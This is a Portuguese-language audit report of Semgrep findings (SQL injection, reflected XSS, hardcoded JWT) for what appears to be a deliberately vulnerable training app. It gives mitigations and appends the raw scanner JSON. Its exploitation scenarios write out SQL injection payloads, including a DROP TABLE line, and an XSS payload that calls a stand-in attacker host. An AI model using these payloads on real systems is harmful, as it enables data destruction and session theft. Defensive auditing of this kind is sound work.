 **Overview**

Remova imediatamente segredos/JWT do repositório e reescreva o histórico se preciso, rotacione tokens/chaves e/ou passe a gerir segredos em Vaults; endureça as respostas HTTP com X-Content-Type-Options: nosniff, Content-Type correto e cookies Secure/HttpOnly, e implemente CSP com nonce/hash para controlar a execução de scripts; por fim, elimine SQL Injection adotando consultas parametrizadas (PreparedStatement/parâmetros nomeados)

1) **SQL Injection por string SQL manual**
**Regra/ID:** java.spring.security.injection.tainted-sql-string.tainted-sql-string
**Local:** app/src/main/java/org/sasanlabs/service/vulnerability/sqlInjection/BlindSQLInjectionVulnerability.java:56
**Descrição:** Construção manual de query SQL diretamente com dados do usuário. Isso abre espaço para injeção e manipulação de dados. (CWE-89; OWASP A01:2017 / A03:2021 – Injection)
**Severidade**: Critical (Semgrep severity=ERROR)
**Cenário de exploração**: Um atacante injeta payloads no parâmetro consumido pela query.
Exemplo: ' OR 1=1 --, '; DROP TABLE users; -- ou time-based/blind (' OR SLEEP(5)--), obtendo leitura/escrita indevida ou exfiltration de dados.
**Mitigações recomendadas**: Parametrizar as consultas é uma excelente opção, normalmente os frameworks de desenvolvimento já trabalham com os "placeholders", PreparedStatement, métodos nomeados entre outras interfaces que mitigam a injeção direta de SQL. 

2) **XSS por HTML concatenado com input do usuário**
**Regra/ID**: java.spring.security.injection.tainted-html-string.tainted-html-string
**Local**: app/src/main/java/org/sasanlabs/service/vulnerability/xss/reflected/XSSInImgTagAttribute.java:70
**Descrição**: Montagem manual de HTML com entrada do usuário sem escaping/encoding; o dado flui para o DOM como código (e não apenas texto), caracterizando XSS refletido (CWE-79; OWASP A07:2017 / A03:2021 – Injection).
**Severidade**: Critical (Semgrep severity=ERROR)
**Cenário de exploração**: Um atacante injeta algo como <img src=x onerror=fetch('https://nu.attacker')> Ao ser refletido sem sanitização, o navegador executa o payload, permitindo roubo de sessão, account takeover, defacement e pivô para CSRF.
**Mitigações recomendadas**: O caminho mais efetivo é endurecer o canal HTTP e a superfície de execução do browser: ative X-Content-Type-Options: nosniff em todas as respostas e garanta o Content-Type correto; marque cookies sensíveis com Secure (HTTPS obrigatório) e HttpOnly (inacessíveis via JS). Implemente CSP para controlar de onde scripts/estilos podem carregar e como executam: use nonce por resposta ou hashes em script-src

3) **Token JWT exposto em recurso da aplicação**
**Regra/ID**: generic.secrets.security.detected-jwt-token.detected-jwt-token
**Local**: app/src/main/resources/attackvectors/JWTVulnerabilityPayload.properties:1
**Descrição**: Token JWT hardcoded em recurso do projeto. Mesmo que usado para teste, a exposição de tokens/chaves é um vetor de abuso e deve ser tratada como secreto. (CWE-321; OWASP A02:2021 – Cryptographic Failures)
**Severidade**: Critical (tratar como crítica até prova de invalidez do token; Semgrep marca severity=ERROR, mas confidence=LOW)
**Cenário de exploração**: Reuso do token para bypass de autenticação/autorização, escalando privilégios se o token for válido ou se a chave/segredo correspondente também vazar. Ataques de replay se o TTL for alto.
**Mitigações recomendadas**: retirar o token do repositório, reescrever histórico se necessário (BFG/Git filter-repo). 
Rotação: invalidar o token e rotacionar chaves/segredos associados. Usar boas práticas JWT: expiração curta, verificação de iss/aud, uso de JWKS para chaves públicas, revocation list quando aplicável.



Abaixo trecho removido do semgrep:

```
    {
      "check_id": "java.spring.security.injection.tainted-sql-string.tainted-sql-string",
      "path": "app/src/main/java/org/sasanlabs/service/vulnerability/sqlInjection/BlindSQLInjectionVulnerability.java",
      "start": {
        "line": 56,
        "col": 17,
        "offset": 2688
      },
      "end": {
        "line": 56,
        "col": 52,
        "offset": 2723
      },
      "extra": {
        "message": "User data flows into this manually-constructed SQL string. User data can be safely inserted into SQL strings using prepared statements or an object-relational mapper (ORM). Manually-constructed SQL strings is a possible indicator of SQL injection, which could let an attacker steal or manipulate data from the database. Instead, use prepared statements (`connection.PreparedStatement`) or a safe library.",
        "metadata": {
          "cwe": [
            "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
          ],
          "owasp": [
            "A01:2017 - Injection",
            "A03:2021 - Injection"
          ],
          "references": [
            "https://docs.oracle.com/javase/7/docs/api/java/sql/PreparedStatement.html"
          ],
          "category": "security",
          "technology": [
            "spring"
          ],
          "cwe2022-top25": true,
          "cwe2021-top25": true,
          "subcategory": [
            "vuln"
          ],
          "likelihood": "HIGH",
          "impact": "MEDIUM",
          "confidence": "MEDIUM",
          "interfile": true,
          "license": "Semgrep Rules License v1.0. For more details, visit semgrep.dev/legal/rules-license",
          "vulnerability_class": [
            "SQL Injection"
          ],
          "source": "https://semgrep.dev/r/java.spring.security.injection.tainted-sql-string.tainted-sql-string",
          "shortlink": "https://sg.run/9rzz"
        },
        "severity": "ERROR",
        "fingerprint": "requires login",
        "lines": "requires login",
        "validation_state": "NO_VALIDATOR",
        "engine_kind": "OSS"
      }
    },
    {
      "check_id": "java.spring.security.injection.tainted-html-string.tainted-html-string",
      "path": "app/src/main/java/org/sasanlabs/service/vulnerability/xss/reflected/XSSInImgTagAttribute.java",
      "start": {
        "line": 70,
        "col": 37,
        "offset": 3189
      },
      "end": {
        "line": 70,
        "col": 44,
        "offset": 3196
      },
      "extra": {
        "message": "Detected user input flowing into a manually constructed HTML string. You may be accidentally bypassing secure methods of rendering HTML by manually constructing HTML and this could create a cross-site scripting vulnerability, which could let attackers steal sensitive user data. To be sure this is safe, check that the HTML is rendered safely. You can use the OWASP ESAPI encoder if you must render user data.",
        "metadata": {
          "cwe": [
            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
          ],
          "owasp": [
            "A07:2017 - Cross-Site Scripting (XSS)",
            "A03:2021 - Injection"
          ],
          "references": [
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
          ],
          "category": "security",
          "technology": [
            "java",
            "spring"
          ],
          "cwe2022-top25": true,
          "cwe2021-top25": true,
          "subcategory": [
            "vuln"
          ],
          "likelihood": "HIGH",
          "impact": "MEDIUM",
          "confidence": "MEDIUM",
          "license": "Semgrep Rules License v1.0. For more details, visit semgrep.dev/legal/rules-license",
          "vulnerability_class": [
            "Cross-Site-Scripting (XSS)"
          ],
          "source": "https://semgrep.dev/r/java.spring.security.injection.tainted-html-string.tainted-html-string",
          "shortlink": "https://sg.run/ObdR"
        },
        "severity": "ERROR",
        "fingerprint": "requires login",
        "lines": "requires login",
        "validation_state": "NO_VALIDATOR",
        "engine_kind": "OSS"
      }
    },{
      "check_id": "generic.secrets.security.detected-jwt-token.detected-jwt-token",
      "path": "app/src/main/resources/attackvectors/JWTVulnerabilityPayload.properties",
      "start": {
        "line": 1,
        "col": 122,
        "offset": 121
      },
      "end": {
        "line": 1,
        "col": 233,
        "offset": 232
      },
      "extra": {
        "message": "JWT token detected",
        "metadata": {
          "source-rule-url": "https://github.com/Yelp/detect-secrets/blob/master/detect_secrets/plugins/jwt.py",
          "category": "security",
          "technology": [
            "secrets",
            "jwt"
          ],
          "confidence": "LOW",
          "references": [
            "https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes/"
          ],
          "cwe": [
            "CWE-321: Use of Hard-coded Cryptographic Key"
          ],
          "owasp": [
            "A02:2021 - Cryptographic Failures"
          ],
          "subcategory": [
            "audit"
          ],
          "likelihood": "LOW",
          "impact": "MEDIUM",
          "license": "Semgrep Rules License v1.0. For more details, visit semgrep.dev/legal/rules-license",
          "vulnerability_class": [
            "Cryptographic Issues"
          ],
          "source": "https://semgrep.dev/r/generic.secrets.security.detected-jwt-token.detected-jwt-token",
          "shortlink": "https://sg.run/05N5"
        },
        "severity": "ERROR",
        "fingerprint": "requires login",
        "lines": "requires login",
        "validation_state": "NO_VALIDATOR",
        "engine_kind": "OSS"
      }
    },
    ```